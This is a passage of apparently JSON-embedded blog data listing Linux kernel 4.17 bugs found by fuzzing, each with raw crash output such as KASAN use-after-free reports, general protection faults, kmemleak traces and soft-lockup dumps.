set_mm_exe_file+0x1d0/0x1d0\n[  697.426397]  ? do_raw_spin_unlock+0xac/0x310\n[  697.426408]  ? do_raw_spin_trylock+0x1b0/0x1b0\n[  697.426419]  ? __down_interruptible+0x700/0x700\n[  697.426430]  ? blocking_notifier_call_chain+0xdb/0x160\n[  697.426444]  ? do_raw_spin_lock+0xb8/0x1c0\n[  697.426460]  ? do_exit+0xdec/0x2480\n[  697.426476]  ? release_task.part.17+0x1970/0x1970\n[  697.426490]  ? lock_release+0x8e0/0x8e0\n[  697.426500]  ? hrtimer_forward+0x2a0/0x2a0\n[  697.426512]  ? do_raw_spin_unlock+0xac/0x310\n[  697.426523]  ? do_raw_spin_trylock+0x1b0/0x1b0\n[  697.426539]  ? _raw_spin_unlock_irqrestore+0x46/0x60\n[  697.426555]  ? hrtimer_try_to_cancel+0xaa/0x620\n[  697.426567]  ? hrtimer_run_softirq+0x210/0x210\n[  697.426577]  ? check_flags.part.37+0x420/0x420\n[  697.426590]  ? do_raw_spin_unlock+0xac/0x310\n[  697.426601]  ? do_raw_spin_trylock+0x1b0/0x1b0\n[  697.426623]  ? hrtimer_cancel+0x2f/0x40\n[  697.426634]  ? futex_wait+0x571/0x980\n[  697.426651]  ? futex_wait_setup+0x3c0/0x3c0\n[  697.426669]  ? __hrtimer_init+0x220/0x220\n[  697.426696]  ? save_trace+0x300/0x300\n[  697.426713]  ? memset+0x1f/0x40\n[  697.426727]  ? find_held_lock+0x33/0x1b0\n[  697.426741]  ? get_signal+0x944/0x19e0\n[  697.426753]  ? check_flags.part.37+0x420/0x420\n[  697.426770]  ? do_group_exit+0x16e/0x3e0\n[  697.426782]  ? is_current_pgrp_orphaned+0x90/0x90\n[  697.426794]  ? _raw_spin_unlock_irq+0x24/0x40\n[  697.426808]  ? get_signal+0x8c3/0x19e0\n[  697.426824]  ? ptrace_notify+0x130/0x130\n[  697.426841]  ? find_held_lock+0x33/0x1b0\n[  697.426856]  ? __x64_sys_futex+0x418/0x535\n[  697.426867]  ? check_flags.part.37+0x420/0x420\n[  697.426884]  ? do_signal+0x92/0x1920\n[  697.426895]  ? pvclock_read_flags+0x150/0x150\n[  697.426905]  ? __might_fault+0x11f/0x1d0\n[  697.426920]  ? setup_sigcontext+0x820/0x820\n[  697.426931]  ? kvm_clock_read+0x21/0x30\n[  697.426939]  ? ktime_get+0x267/0x2f0\n[  697.426952]  ? ktime_get_raw_ts64+0x370/0x370\n[  697.426974]  ? __x64_sys_futex+0x359/0x535\n[  697.426984]  ? __x64_sys_futex+0x363/0x535\n[  697.426996]  ? exit_to_usermode_loop+0x1ab/0x270\n[  697.427009]  ? exit_to_usermode_loop+0x1fa/0x270\n[  697.427019]  ? syscall_slow_exit_work+0x4d0/0x4d0\n[  697.427029]  ? __x64_sys_timer_create+0x1d0/0x1d0\n[  697.427042]  ? do_syscall_64+0x8d/0x670\n[  697.427054]  ? do_syscall_64+0x5b3/0x670\n[  697.427064]  ? syscall_slow_exit_work+0x4d0/0x4d0\n[  697.427074]  ? syscall_return_slowpath+0x4e0/0x4e0\n[  697.427085]  ? syscall_return_slowpath+0x342/0x4e0\n[  697.427098]  ? entry_SYSCALL_64_after_hwframe+0x59/0xbe\n[  697.427111]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  697.427126]  ? entry_SYSCALL_64_after_hwframe+0x49/0xbe\n[  697.427141] Modules linked in:\n[  697.427150] Dumping ftrace buffer:\n[  697.427155]    (ftrace buffer empty)\n[  697.427189] ---[ end trace 2dcb8303d5b0889e ]---\n[  697.427200] RIP: 0010:release_pages+0x12d2/0x22c0\n[  697.427202] Code: 0f 85 ab 0e 00 00 48 8b 44 24 08 45 31 e4 48 8b 28 e9 e3 fe ff ff e8 fd 89 dd ff 48 c7 c6 e0 af 8c 8f 48 89 ef e8 2e 9e 09 00 <0f> 0b e8 e7 89 dd ff 49 8d 6d ff e9 65 f0 ff ff e8 d9 89 dd ff 4c \n[  697.427396] RSP: 0018:ffff880045d3e2f0 EFLAGS: 00010286\n[  697.427405] RAX: 0000000000000000 RBX: dffffc0000000000 RCX: 0000000000000000\n[  697.427411] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffffed0008ba7c50\n[  697.427418] RBP: ffffea0000003600 R08: ffff8800457842c0 R09: ffffed000ce63d06\n[  697.427424] R10: ffffed000ce63d06 R11: ffff88006731e837 R12: 0000000000000000\n[  697.427430] R13: ffffea0000003634 R14: ffffed0008ba7c90 R15: 1ffff10008ba7c78\n[  697.427438] FS:  0000000000ba1940(0000) GS:ffff880067300000(0000) knlGS:0000000000000000\n[  697.427445] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  697.427451] CR2: 00007f95ce09e349 CR3: 000000005236a000 CR4: 00000000000006e0\n[  697.427458] Kernel panic - not syncing: Fatal exception\n[  697.434901] Dumping ftrace buffer:\n[  697.434908]    (ftrace buffer empty)\n[  697.434919] Kernel Offset: 0xb400000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\n[  697.629931] Rebooting in 86400 seconds..\n```\n\n\n\n\n## bad rss-counter state - bug\n\nFound in LK v4.17.0+.\n\n### Call Trace (Dump)\n\n```c\n...\n[ 1251.494022] BUG: Bad rss-counter state mm:00000000bb7fc423 idx:0 val:8192\n[ 1251.494998] BUG: Bad rss-counter state mm:00000000bb7fc423 idx:1 val:2\n[ 1251.495890] BUG: non-zero pgtables_bytes on freeing mm: 73728\n...\n```\n\n\n## dev_watchdog - warning\n\nGot from syzkaller & Found in LK v4.17.0+.\n\n### Call Trace (Dump)\n\n```c\n------------[ cut here ]------------\nNETDEV WATCHDOG: eth0 (e1000): transmit queue 0 timed out\nWARNING: CPU: 1 PID: 0 at net/sched/sch_generic.c:461 dev_watchdog+0x919/0xa40 net/sched/sch_generic.c:460\nKernel panic - not syncing: panic_on_warn set ...\n\nCPU: 1 PID: 0 Comm: swapper/1 Not tainted 4.17.0+ #9\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n <IRQ>\n </IRQ>\nDumping ftrace buffer:\n   (ftrace buffer empty)\nKernel Offset: 0x12800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\nRebooting in 86400 seconds..\n```\n\n\n## ext4_data_block_valid - use after free Read\n\nFound in LK v4.17.0+. Interesting one... :)\n\n### Call Trace (Dump)\n\n```c\n[  198.171416] EXT4-fs (sda): re-mounted. Opts: noblock_validity,,errors=continue\n[  198.171520] ==================================================================\n[  198.173422] BUG: KASAN: use-after-free in ext4_data_block_valid+0x2c1/0x320\n[  198.174371] Read of size 8 at addr ffff880065ee36a8 by task syz-executor6/12409\n[  198.175341] \n[  198.175547] CPU: 0 PID: 12409 Comm: syz-executor6 Not tainted 4.17.0+ #9\n[  198.176441] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  198.177609] Call Trace:\n[  198.177931]  ? dump_stack+0x138/0x229\n[  198.178478]  ? dump_stack_print_info.cold.1+0x45/0x45\n[  198.179109]  ? kmsg_dump_rewind_nolock+0xd9/0xd9\n[  198.179785]  ? ext4_data_block_valid+0x2c1/0x320\n[  198.180363]  ? print_address_description+0x60/0x25c\n[  198.181055]  ? ext4_data_block_valid+0x2c1/0x320\n[  198.181820]  ? kasan_report.cold.7+0xac/0x2f4\n[  198.182421]  ? ext4_data_block_valid+0x2c1/0x320\n[  198.183134]  ? __check_block_validity.constprop.82+0xbc/0x200\n[  198.183918]  ? ext4_map_blocks+0xf5a/0x19d0\n[  198.184531]  ? ext4_issue_zeroout+0x150/0x150\n[  198.185152]  ? ext4_getblk+0x4b9/0x5d0\n[  198.185640]  ? __lock_is_held+0xad/0x140\n[  198.186140]  ? ext4_iomap_begin+0x1210/0x1210\n[  198.186735]  ? mark_held_locks+0xc1/0x140\n[  198.187257]  ? ext4_bread_batch+0x79/0x3f0\n[  198.187795]  ? ext4_find_entry+0x612/0x1140\n[  198.188335]  ? ext4_dx_find_entry+0x400/0x400\n[  198.188905]  ? d_alloc+0x267/0x330\n[  198.189346]  ? do_raw_spin_unlock+0xac/0x310\n[  198.189899]  ? do_raw_spin_trylock+0x1b0/0x1b0\n[  198.190496]  ? mark_held_locks+0xc1/0x140\n[  198.191004]  ? d_lookup+0x17f/0x1e0\n[  198.191475]  ? ext4_lookup+0x15a/0x6a0\n[  198.191953]  ? ext4_cross_rename+0x1d20/0x1d20\n[  198.192530]  ? __lookup_hash+0x12a/0x190\n[  198.193029]  ? filename_create+0x1ba/0x560\n[  198.193580]  ? kern_path_mountpoint+0x40/0x40\n[  198.194189]  ? rcu_read_lock_sched_held+0x102/0x120\n[  198.194848]  ? getname_flags+0x268/0x5a0\n[  198.195366]  ? do_symlinkat+0xe7/0x260\n[  198.195866]  ? __x64_sys_unlinkat+0x120/0x120\n[  198.196435]  ? do_syscall_64+0x8d/0x670\n[  198.196930]  ? do_syscall_64+0x165/0x670\n[  198.197443]  ? syscall_return_slowpath+0x4e0/0x4e0\n[  198.198049]  ? syscall_return_slowpath+0x342/0x4e0\n[  198.198686]  ? prepare_exit_to_usermode+0x380/0x380\n[  198.199312]  ? entry_SYSCALL_64_after_hwframe+0x59/0xbe\n[  198.199986]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  198.200650]  ? entry_SYSCALL_64_after_hwframe+0x49/0xbe\n[  198.201317] \n[  198.201538] Allocated by task 1:\n[  198.201948] (stack is not available)\n[  198.202435] \n[  198.202649] Freed by task 12388:\n[  198.203062] (stack is not available)\n[  198.203532] \n[  198.203742] The buggy address belongs to the object at ffff880065ee3690\n[  198.203742]  which belongs to the cache ext4_system_zone of size 40\n[  198.205321] The buggy address is located 24 bytes inside of\n[  198.205321]  40-byte region [ffff880065ee3690, ffff880065ee36b8)\n[  198.206771] The buggy address belongs to the page:\n[  198.207384] page:ffffea000197b8c0 count:1 mapcount:0 mapping:ffff8800692fbc80 index:0x0\n[  198.208380] flags: 0x100000000000100(slab)\n[  198.208914] raw: 0100000000000100 dead000000000100 dead000000000200 ffff8800692fbc80\n[  198.209879] raw: 0000000000000000 0000000080490049 00000001ffffffff 0000000000000000\n[  198.210872] page dumped because: kasan: bad access detected\n[  198.211581] \n[  198.211788] Memory state around the buggy address:\n[  198.212388]  ffff880065ee3580: fb fb fb fb fc fc fb fb fb fb fb fc fc fb fb fb\n[  198.213285]  ffff880065ee3600: fb fb fc fc fb fb fb fb fb fc fc fb fb fb fb fb\n[  198.214183] >ffff880065ee3680: fc fc fb fb fb fb fb fc fc fc fc fc fc fc fc fc\n[  198.215139]                                   ^\n[  198.215145]  ffff880065ee3700: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[  198.215150]  ffff880065ee3780: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[  198.215152] ==================================================================\n```\n\n## kmem_cache_alloc - general page fault\n\nFound on LK v4.17.0+. lead to null-dereference.\n\n### Call Trace (Dump)\n\n```c\nkasan: CONFIG_KASAN_INLINE enabled\nkasan: GPF could be caused by NULL-ptr deref or user memory access\ngeneral protection fault: 0000 [#1] SMP KASAN PTI\nCPU: 0 PID: 30860 Comm: modprobe Not tainted 4.17.0+ #9\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:prefetch_freepointer mm/slub.c:275 [inline]\nRIP: 0010:slab_alloc_node mm/slub.c:2701 [inline]\nRIP: 0010:slab_alloc mm/slub.c:2716 [inline]\nRIP: 0010:kmem_cache_alloc+0xb0/0x290 mm/slub.c:2721\nCode: 00 49 8b 1c 04 40 f6 c7 0f 0f 85 9e 01 00 00 48 8d 4a 01 4c 89 e0 65 48 0f c7 0f 0f 94 c0 84 c0 74 b0 48 85 db 74 0a 8b 45 20 <48> 8b 04 03 0f 18 08 41 f7 c5 00 80 00 00 0f 85 20 01 00 00 8b 1d \nRSP: 0018:ffff880041797ba8 EFLAGS: 00010206\nRAX: 0000000000000000 RBX: 20007e0e00000a21 RCX: 0000000000067974\nRDX: 0000000000067973 RSI: 00000000006000c0 RDI: 000000000002fb40\nRBP: ffff88006cdfb080 R08: ffff88006d02fb40 R09: 0000000000000003\nR10: 0000000000000001 R11: ffff8800417978f8 R12: ffff880045a61108\nR13: 00000000006000c0 R14: ffffffffb7f62a37 R15: 0000000000000000\nFS:  0000000000000000(0000) GS:ffff88006d000000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00007f316cd22db8 CR3: 000000002c19a000 CR4: 00000000000006f0\nDR0: 0000000020000000 DR1: 0000000020000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000600\n```\n\n\n## qlist_free_all - unable to handle kernel paging request\n\nFound on LK v4.17.0+.\n\n### Call Trace (Dump)\n\n```c\nBUG: unable to handle kernel paging request at 00000be050002008\nPGD 0 P4D 0 \nOops: 0000 [#1] SMP KASAN PTI\nCPU: 0 PID: 10987 Comm: udevd Not tainted 4.17.0+ #9\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:virt_to_head_page include/linux/mm.h:638 [inline]\nRIP: 0010:qlink_to_cache mm/kasan/quarantine.c:127 [inline]\nRIP: 0010:qlist_free_all+0x7b/0xc0 mm/kasan/quarantine.c:163\nCode: df 48 85 db 75 db 48 89 f0 4c 01 f0 72 54 4c 89 fa 48 2b 15 d7 bf 3e 03 48 01 d0 48 c1 e8 0c 48 c1 e0 06 48 03 05 b5 bf 3e 03 <48> 8b 50 08 48 8d 4a ff 83 e2 01 48 0f 45 c1 48 8b 78 18 eb a2 49 \nRSP: 0018:ffff880063eef8f0 EFLAGS: 00010207\nRAX: 00000be050002000 RBX: 0000000000000000 RCX: 0000000000000000\nRDX: 000077ff80000000 RSI: 0008001400080004 RDI: 0000000000000000\nRBP: 0008001400080004 R08: 0000000000000001 R09: 0000000000000000\nR10: 0000000000000000 R11: 0000000000000001 R12: ffffffffa99fd7d2\nR13: ffff880063eef928 R14: 0000000080000000 R15: ffffffff80000000\nFS:  00007f9b8de627a0(0000) GS:ffff88006d000000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00000be050002008 CR3: 0000000067e9e000 CR4: 00000000000006f0\n```\n\n","excerpt":"_decode_session6 - soft lockup Got from syzkaller & Found in LK v4.17.0-rc7. Call Trace (Dump) I'll update a post later... End rb_insert_co…","fields":{"slug":"/2018-06-3-Founds/"},"frontmatter":{"date":"Jun 17, 2018","title":"Linux Kernel - 2018-06-3 Founds","tags":["Security","Linux-Kernel"],"update":"Jun 20, 2018"},"timeToRead":24}},{"node":{"rawMarkdownBody":"\n## create_filter - memory leak\n\nFound on LK v4.17.x.\n\n### kmemleak message\n\n```c\nunreferenced object 0xffff880069abee18 (size 8):\n  comm \"poc\", pid 14081, jiffies 4294976277 (age 10.671s)\n  hex dump (first 8 bytes):\n    02 00 00 00 00 00 00 00                          ........\n  backtrace:\n    [<00000000f15d2c1d>] create_filter+0xa6/0x250\n    [<00000000be54913e>] ftrace_profile_set_filter+0x119/0x2b0\n    [<0000000006f0d3d0>] _perf_ioctl+0x1134/0x1ab0\n    [<00000000505ea0fc>] perf_ioctl+0x54/0x80\n    [<00000000dfc7d1ee>] do_vfs_ioctl+0x1c6/0x15f0\n    [<00000000482ffdb2>] ksys_ioctl+0x9b/0xc0\n    [<00000000082e2070>] __x64_sys_ioctl+0x6f/0xb0\n    [<000000005a913096>] do_syscall_64+0x165/0x670\n    [<0000000065ee7513>] entry_SYSCALL_64_after_hwframe+0x49/0xbe\n    [<000000005b168a0c>] 0xffffffffffffffff\n```\n\n## pcpu_create_chunk - memory leak\n\nFound on LK v4.17.x.\n\n### kmemleak message\n\n```c\nunreferenced object 0xffffc90000538000 (size 8192):\n  comm \"poc\", pid 10557, jiffies 4294785036 (age 9.722s)\n  hex dump (first 32 bytes):\n    00 04 00 00 00 00 00 00 00 04 00 00 00 04 00 00  ................\n    00 00 00 00 00 04 00 00 00 00 00 00 00 04 00 00  ................\n  backtrace:\n    [<00000000ec587bbf>] __vmalloc+0x63/0x80\n    [<0000000047066f5b>] pcpu_mem_zalloc+0x89/0xd0\n    [<00000000a75fa3be>] pcpu_create_chunk+0x211/0x960\n    [<0000000088bef858>] pcpu_alloc+0xf1b/0x12b0\n    [<0000000071dc4e5e>] array_map_alloc+0x4f3/0x5f0\n    [<00000000b61a2dcb>] map_create+0x3ab/0xee0\n    [<00000000006870c4>] __x64_sys_bpf+0x2a9/0x470\n    [<00000000bb572e98>] do_syscall_64+0x165/0x670\n    [<000000003a252153>] entry_SYSCALL_64_after_hwframe+0x49/0xbe\n    [<000000006f02ac52>] 0xffffffffffffffff\n```\n\n## set_precision - warning\n\nGot from syzkaller & Found in LK v4.17.0+.\n\n### Call Trace (Dump)\n\n```c\n...\nprecision 1047645 too large\nWARNING: CPU: 0 PID: 12208 at lib/vsprintf.c:2164 set_precision+0xb8/0xe0 lib/vsprintf.c:2164\nKernel panic - not syncing: panic_on_warn set ...\n\nCPU: 0 PID: 12208 Comm: syz-executor14 Not tainted 4.17.0+ #9\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\nDumping ftrace buffer:\n   (ftrace buffer empty)\nKernel Offset: 0x8200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\n...\n```\n\n\n\n\n## __xfrm_policy_check - general page fault\n\nFound on LK v4.17.0+. lead to null-dereference.\n\n### Call Trace (Dump)\n\n```c\n[  758.398101] kasan: GPF could be caused by NULL-ptr deref or user memory access\n[  758.403122] general protection fault: 0000 [#1] SMP KASAN PTI\n[  758.404402] CPU: 1 PID: 18 Comm: ksoftirqd/1 Not tainted 4.17.0+ #9\n[  758.405809] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  758.413827] RIP: 0010:__xfrm_policy_check+0x28c/0x2280\n[  758.414978] Code: 89 c6 e8 e7 86 dd fd 45 85 e4 0f 85 71 02 00 00 e8 c9 85 dd fd 48 8d 7b 08 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 a1 1c 00 00 48 8b 5b 08 48 85 db 74 14 e8 9c 85 \n[  758.419274] RSP: 0018:ffff88006c666828 EFLAGS: 00010202\n[  758.423272] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: ffffffff9ba8c807\n[  758.424848] RDX: 0000000000000001 RSI: 0000000000000000 RDI: 0000000000000008\n[  758.433162] RBP: ffff88006c666b50 R08: ffff88006c6442c0 R09: ffffed000da2451a\n[  758.434732] R10: 0000000000000001 R11: ffff88006d1228d3 R12: 0000000000000001\n[  758.436297] R13: 0000000000000000 R14: 000000000000000a R15: ffff88003df54500\n[  758.437868] FS:  0000000000000000(0000) GS:ffff88006d100000(0000) knlGS:0000000000000000\n[  758.439623] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  758.442808] CR2: ffffffffff600400 CR3: 0000000065db8000 CR4: 00000000000006e0\n[  758.444373] Call Trace:\n[  758.452834]  ? __xfrm_route_forward+0x640/0x640\n[  758.453850]  ? __lock_acquire+0xa74/0x4f90\n[  758.454778]  ? check_flags.part.37+0x420/0x420\n[  758.455771]  ? dequeue_task_fair+0x4ae0/0x4ae0\n[  758.456781]  ? __lock_acquire+0x4f90/0x4f90\n[  758.457727]  ? __local_bh_enable_ip+0x124/0x1a0\n[  758.458746]  ? ip6t_do_table+0xbea/0x15a0\n[  758.459652]  ? __local_bh_enable_ip+0x124/0x1a0\n[  758.460673]  ? save_trace+0x300/0x300\n[  758.461519]  ? icmpv6_rcv+0xb08/0x19c0\n[  758.462922]  ? icmpv6_notify+0x870/0x870\n[  758.473310]  ? ip6_input_finish+0x438/0x1af0\n[  758.474292]  ? ip6_rcv_finish+0x880/0x880\n[  758.475191]  ? nf_hook_slow+0x114/0x1c0\n[  758.476060]  ? ip6_input+0xe3/0x630\n[  758.476866]  ? ip6_input_finish+0x1af0/0x1af0\n[  758.477844]  ? ip6_rcv_finish+0x880/0x880\n[  758.478750]  ? find_held_lock+0x33/0x1b0\n[  758.479634]  ? ipv6_rcv+0x1a0f/0x2090\n[  758.480474]  ? ip6_rcv_finish+0x1ea/0x880\n[  758.481374]  ? ip6_make_skb+0x5b0/0x5b0\n[  758.482240]  ? rcu_is_watching+0x81/0x130\n[  758.483147]  ? nf_hook_slow+0x114/0x1c0\n[  758.484013]  ? ipv6_rcv+0xef6/0x2090\n[  758.493457]  ? ip6_input+0x630/0x630\n[  758.494292]  ? ip6_make_skb+0x5b0/0x5b0\n[  758.495158]  ? __lock_acquire+0xa74/0x4f90\n[  758.496076]  ? find_next_and_bit+0x177/0x1d0\n[  758.497050]  ? ip6_input+0x630/0x630\n[  758.497863]  ? __netif_receive_skb_core+0x23e2/0x3570\n[  758.498981]  ? nf_ingress+0x9d0/0x9d0\n[  758.499812]  ? update_group_capacity+0xb10/0xb10\n[  758.500853]  ? __lock_acquire+0xa74/0x4f90\n[  758.501775]  ? print_usage_bug+0x140/0x140\n[  758.502699]  ? lock_release+0x8e0/0x8e0\n[  758.513246]  ? print_usage_bug+0x140/0x140\n[  758.514187]  ? _raw_spin_unlock_irqrestore+0x46/0x60\n[  758.515298]  ? __lock_acquire+0xa74/0x4f90\n[  758.516220]  ? update_blocked_averages+0x19ae/0x2c70\n[  758.517336]  ? find_busiest_group+0xe1/0x1740\n[  758.518307]  ? save_trace+0x300/0x300\n[  758.519137]  ? find_held_lock+0x33/0x1b0\n[  758.520019]  ? lock_acquire+0x1b3/0x4a0\n[  758.520896]  ? process_backlog+0x1e4/0x760\n[  758.521818]  ? __lock_acquire+0x4f90/0x4f90\n[  758.522756]  ? do_raw_spin_trylock+0x1b0/0x1b0\n[  758.523764]  ? rcu_is_watching+0x81/0x130\n[  758.524675]  ? _rcu_barrier_trace+0x450/0x450\n[  758.534016]  ? __netif_receive_skb+0x27/0x1c0\n[  758.535008]  ? process_backlog+0x257/0x760\n[  758.535931]  ? rcu_gp_kthread+0x3cf0/0x3cf0\n[  758.536890]  ? net_rx_action+0x6e5/0x1710\n[  758.537794]  ? check_flags.part.37+0x420/0x420\n[  758.538787]  ? napi_complete_done+0x5d0/0x5d0\n[  758.539760]  ? lock_pin_lock+0x340/0x340\n[  758.540658]  ? save_trace+0x300/0x300\n[  758.541485]  ? pick_next_task_fair+0x6cb/0x18a0\n[  758.542492]  ? rebalance_domains+0x372/0xc40\n[  758.551306]  ? find_held_lock+0x33/0x1b0\n[  758.552184]  ? finish_task_switch+0x1c7/0x780\n[  758.553142]  ? check_flags.part.37+0x420/0x420\n[  758.554112]  ? finish_task_switch+0x186/0x780\n[  758.557391]  ? do_raw_spin_unlock+0xac/0x310\n[  758.558316]  ? do_raw_spin_trylock+0x1b0/0x1b0\n[  758.559266]  ? find_held_lock+0x33/0x1b0\n[  758.573321]  ? _raw_spin_unlock_irq+0x24/0x40\n[  758.574261]  ? finish_task_switch+0x27b/0x780\n[  758.575211]  ? set_load_weight+0x270/0x270\n[  758.576103]  ? lock_repin_lock+0x410/0x410\n[  758.577008]  ? __schedule+0x6c8/0x1c80\n[  758.577855]  ? rcu_is_watching+0x81/0x130\n[  758.578752]  ? lock_repin_lock+0x410/0x410\n[  758.579655]  ? rcu_pm_notify+0xc0/0xc0\n[  758.580489]  ? __do_softirq+0x2b1/0xa80\n[  758.581321]  ? pci_mmcfg_check_reserved+0x170/0x170\n[  758.582355]  ? __irqentry_text_end+0x1f9795/0x1f9795\n[  758.583406]  ? retint_kernel+0x10/0x10\n[  758.584215]  ? schedule+0xf0/0x3a0\n[  758.584957]  ? __schedule+0x1c80/0x1c80\n[  758.585791]  ? rcu_note_context_switch+0x710/0x710\n[  758.586810]  ? run_ksoftirqd+0x2e/0x50\n[  758.587621]  ? takeover_tasklets+0x8e0/0x8e0\n[  758.588544]  ? run_ksoftirqd+0x29/0x50\n[  758.613420]  ? smpboot_thread_fn+0x3bd/0x7f0\n[  758.614474]  ? sort_range+0x30/0x30\n[  758.615319]  ? do_raw_spin_lock+0xb8/0x1c0\n[  758.616301]  ? _raw_spin_unlock_irqrestore+0x46/0x60\n[  758.617436]  ? sort_range+0x30/0x30\n[  758.618231]  ? sort_range+0x30/0x30\n[  758.619478]  ? kthread+0x339/0x400\n[  758.621088]  ? kthread_create_worker_on_cpu+0xe0/0xe0\n[  758.623485]  ? ret_from_fork+0x3a/0x50\n[  758.625174] Modules linked in:\n[  758.626598] Dumping ftrace buffer:\n[  758.628140]    (ftrace buffer empty)\n[  758.629857] ---[ end trace bce99c3ba534df6a ]---\n[  758.632020] RIP: 0010:__xfrm_policy_check+0x28c/0x2280\n[  758.634057] Code: 89 c6 e8 e7 86 dd fd 45 85 e4 0f 85 71 02 00 00 e8 c9 85 dd fd 48 8d 7b 08 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 a1 1c 00 00 48 8b 5b 08 48 85 db 74 14 e8 9c 85 \n[  758.656587] RSP: 0018:ffff88006c666828 EFLAGS: 00010202\n[  758.657738] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: ffffffff9ba8c807\n[  758.659234] RDX: 0000000000000001 RSI: 0000000000000000 RDI: 0000000000000008\n[  758.661676] RBP: ffff88006c666b50 R08: ffff88006c6442c0 R09: ffffed000da2451a\n[  758.663278] R10: 0000000000000001 R11: ffff88006d1228d3 R12: 0000000000000001\n[  758.664822] R13: 0000000000000000 R14: 000000000000000a R15: ffff88003df54500\n[  758.667171] FS:  0000000000000000(0000) GS:ffff88006d100000(0000) knlGS:0000000000000000\n[  758.678044] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  758.679296] CR2: ffffffffff600400 CR3: 0000000065db8000 CR4: 00000000000006e0\n[  758.680804] Kernel panic - not syncing: Fatal exception in interrupt\n[  758.682315] Dumping ftrace buffer:\n[  758.682795]    (ftrace buffer empty)\n[  758.684660] Kernel Offset: 0x18400000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\n[  758.687236] Rebooting in 86400 seconds..\n```\n\n\n## __xfrm_decode_session - soft lockup\n\nGot from syzkaller & Found in LK v4.17.0-rc5.\n\n### Call Trace (Dump)\n\n```c\nwatchdog: BUG: soft lockup - CPU#1 stuck for 23s! [syz-executor1:6644]\nModules linked in:\nirq event stamp: 54949\nhardirqs last  enabled at (54948): [<ffffffff84e00a60>] restore_regs_and_return_to_kernel+0x0/0x30\nhardirqs last disabled at (54949): [<ffffffff84e00964>] interrupt_entry+0xc4/0xe0 arch/x86/entry/entry_64.S:625\nsoftirqs last  enabled at (180): [<ffffffff839538d0>] tun_napi_alloc_frags drivers/net/tun.c:1476 [inline]\nsoftirqs last  enabled at (180): [<ffffffff839538d0>] tun_get_user+0x1cf0/0x3a30 drivers/net/tun.c:1822\nsoftirqs last disabled at (184): [<ffffffff8395484a>] tun_get_user+0x2c6a/0x3a30 drivers/net/tun.c:1936\nCPU: 1 PID: 6644 Comm: syz-executor1 Not tainted 4.17.0-rc5 #6\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:_decode_session6+0x98c/0x11d0 net/ipv6/xfrm6_policy.c:164\nRSP: 0018:ffff880066b8e500 EFLAGS: 00000a03 ORIG_RAX: ffffffffffffff13\nRAX: 0000000000000000 RBX: ffff88006596aa40 RCX: ffffffff845c993b\nRDX: 0000000000000006 RSI: ffffc90002437000 RDI: 0000000000004b20\nRBP: ffff880066b8e588 R08: ffff880067b9dc40 R09: ffff880066b8e678\nR10: ffffed000cd71cd9 R11: ffff880066b8e6cf R12: ffff880045714b6e\nR13: ffff88004571004e R14: dffffc0000000000 R15: 000000000000004e\nFS:  00007fcba1674700(0000) GS:ffff88006cf00000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 0000000020010000 CR3: 0000000069702000 CR4: 00000000000006e0\nCall Trace:\n __xfrm_decode_session+0x64/0x120 net/xfrm/xfrm_policy.c:2368\n xfrm_decode_session_reverse include/net/xfrm.h:1214 [inline]\n icmpv6_route_lookup+0x39b/0x710 net/ipv6/icmp.c:372\n icmp6_send+0x1862/0x2940 net/ipv6/icmp.c:551\n icmpv6_send+0x1ac/0x350 net/ipv6/ip6_icmp.c:43\n ip6_pkt_drop+0x183/0x450 net/ipv6/route.c:3559\n dst_input include/net/dst.h:450 [inline]\n ip6_rcv_finish+0x1ea/0x880 net/ipv6/ip6_input.c:71\n NF_HOOK include/linux/netfilter.h:288 [inline]\n ipv6_rcv+0xf13/0x22b0 net/ipv6/ip6_input.c:208\n __netif_receive_skb_core+0x25c5/0x3560 net/core/dev.c:4592\n __netif_receive_skb+0x27/0x1c0 net/core/dev.c:4657\n netif_receive_skb_internal+0x12d/0x7c0 net/core/dev.c:4731\n napi_frags_finish net/core/dev.c:5172 [inline]\n napi_gro_frags+0x60b/0xbc0 net/core/dev.c:5245\nCode: 85 55 07 00 00 0f b7 7c 24 50 41 0f b6 44 24 01 4c 89 e2 83 e2 07 8d 44 c7 08 66 89 44 24 50 4c 89 e0 48 c1 e8 03 42 0f b6 04 30 <38> d0 7f 08 84 c0 0f 85 2d 07 00 00 45 0f b6 24 24 e9 